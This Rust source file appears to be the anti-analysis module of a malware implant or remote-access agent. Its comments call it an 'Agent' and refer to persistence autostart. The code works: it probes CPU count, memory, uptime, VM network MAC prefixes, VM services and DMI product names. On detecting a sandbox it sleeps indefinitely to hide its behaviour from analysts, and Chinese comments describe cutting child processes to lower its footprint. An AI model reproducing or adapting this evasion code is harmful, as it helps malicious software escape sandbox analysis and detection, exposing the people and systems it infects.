//! Anti-analysis module — VM detection, sandbox detection, environment probing.
//! Port of EnvironmentProbe.cs, SandboxDetector.cs, VmDetector.cs.

/// Main entry point: returns true if it's safe to execute.
/// If a sandbox is detected, sleeps indefinitely and returns false.
/// `skip_uptime`: skip the uptime < 5min check (used when launched from persistence autostart).
pub fn should_execute() -> bool {
    should_execute_inner(false)
}

pub fn should_execute_ex(skip_uptime: bool) -> bool {
    should_execute_inner(skip_uptime)
}

fn should_execute_inner(skip_uptime: bool) -> bool {
    if is_sandbox_ex(skip_uptime) {
        libra_common::dlog!("[Agent] Sandbox detected. Sleeping indefinitely.");
        std::thread::sleep(std::time::Duration::from_secs(u64::MAX));
        return false;
    }

    if is_virtual_machine() {
        libra_common::dlog!("[Agent] VM detected — may still execute depending on config.");
    }

    true
}

// ── Sandbox Detection ──────────────────────────────────────────────────

pub fn is_sandbox() -> bool {
    is_sandbox_ex(false)
}

pub fn is_sandbox_ex(skip_uptime: bool) -> bool {
    check_cpu_cores() || check_memory() || (!skip_uptime && check_uptime())
}

fn check_cpu_cores() -> bool {
    match std::thread::available_parallelism() {
        Ok(n) => n.get() < 2,
        Err(_) => false,
    }
}

fn check_memory() -> bool {
    let sys = sysinfo::System::new_with_specifics(
        sysinfo::RefreshKind::nothing().with_memory(sysinfo::MemoryRefreshKind::everything()),
    );
    let total_mb = sys.total_memory() / (1024 * 1024);
    total_mb < 2048
}

fn check_uptime() -> bool {
    let uptime = get_system_uptime_secs();
    uptime < 300 // Less than 5 minutes
}

fn get_system_uptime_secs() -> u64 {
    #[cfg(target_os = "linux")]
    {
        if let Ok(content) = std::fs::read_to_string("/proc/uptime") {
            if let Some(uptime_str) = content.split_whitespace().next() {
                if let Ok(uptime) = uptime_str.parse::<f64>() {
                    return uptime as u64;
                }
            }
        }
        3600
    }
    #[cfg(target_os = "macos")]
    {
        use std::process::Command;
        if let Ok(output) = Command::new("sysctl")
            .args(["-n", "kern.boottime"])
            .output()
        {
            let text = String::from_utf8_lossy(&output.stdout);
            // Format: { sec = 123456, usec = 789012 }
            if let Some(sec_start) = text.find("sec = ") {
                let rest = &text[sec_start + 6..];
                if let Some(sec_end) = rest.find(|c: char| !c.is_ascii_digit()) {
                    if let Ok(boot_time) = rest[..sec_end].parse::<u64>() {
                        let now = std::time::SystemTime::now()
                            .duration_since(std::time::UNIX_EPOCH)
                            .unwrap_or_default()
                            .as_secs();
                        return now.saturating_sub(boot_time);
                    }
                }
            }
        }
        3600
    }
    #[cfg(windows)]
    {
        // GetTickCount64（kernel32，Vista+）——无子进程（进程面收敛二期）
        #[link(name = "kernel32")]
        extern "system" {
            fn GetTickCount64() -> u64;
        }
        let ms = unsafe { GetTickCount64() };
        if ms > 0 {
            return ms / 1000;
        }
        // 兜底：sysinfo（关联函数）
        let uptime = sysinfo::System::uptime();
        if uptime > 0 {
            return uptime;
        }
        3600
    }
    #[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
    {
        3600
    }
}

// ── VM Detection ───────────────────────────────────────────────────────

pub fn is_virtual_machine() -> bool {
    #[cfg(target_os = "windows")]
    {
        check_windows_vm()
    }
    #[cfg(not(target_os = "windows"))]
    {
        check_linux_vm()
    }
}

#[cfg(target_os = "windows")]
fn check_windows_vm() -> bool {
    // VM MAC 前缀检测（sysinfo::Networks，无子进程——进程面收敛二期）
    {
        let networks = sysinfo::Networks::new_with_refreshed_list();
        let vm_macs = ["00:05:69", "00:0c:29", "00:1c:42", "00:50:56", "08:00:27"];
        for (_name, iface) in networks.iter() {
            let mac = iface.mac_address().to_string().to_lowercase();
            if vm_macs.iter().any(|m| mac.starts_with(m)) {
                return true;
            }
        }
    }

    // VM 服务检测（SCM 原生 API，无子进程）
    if vm_service_running("vmtools") || vm_service_running("vboxservice") {
        return true;
    }

    false
}

/// 用 SCM 查询服务是否 RUNNING（OpenSCManager/OpenService/QueryServiceStatus）。
#[cfg(target_os = "windows")]
fn vm_service_running(name: &str) -> bool {
    use windows::Win32::System::Services::*;
    use windows_core::PCWSTR;

    unsafe {
        let scm = OpenSCManagerW(None, None, SC_MANAGER_CONNECT);
        if scm.is_err() {
            return false;
        }
        let scm = scm.unwrap();
        let svc_name = PCWSTR(wide(name).as_ptr());
        let svc = OpenServiceW(scm, svc_name, SERVICE_QUERY_STATUS);
        if svc.is_err() {
            let _ = CloseServiceHandle(scm);
            return false;
        }
        let svc = svc.unwrap();
        let mut status = SERVICE_STATUS::default();
        let ok = QueryServiceStatus(svc, &mut status).is_ok();
        let running = ok && status.dwCurrentState == SERVICE_RUNNING;
        let _ = CloseServiceHandle(svc);
        let _ = CloseServiceHandle(scm);
        running
    }
}

#[cfg(target_os = "windows")]
fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

#[cfg(not(target_os = "windows"))]
fn check_linux_vm() -> bool {
    if let Ok(dmi) = exec(
        "/bin/sh",
        &["-c", "cat /sys/class/dmi/id/product_name 2>/dev/null"],
    ) {
        let lower = dmi.to_lowercase();
        let vm_keywords = ["virtualbox", "vmware", "kvm", "qemu", "xen"];
        if vm_keywords.iter().any(|k| lower.contains(k)) {
            return true;
        }
    }
    false
}

/// Linux 辅助：执行命令取输出（仅 Linux 反沙盒探测使用；Windows 路径零子进程）。
#[cfg(not(target_os = "windows"))]
#[allow(dead_code)]
fn exec(cmd: &str, args: &[&str]) -> Result<String, ()> {
    let output = std::process::Command::new(cmd)
        .args(args)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::null())
        .output()
        .map_err(|_| ())?;
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}
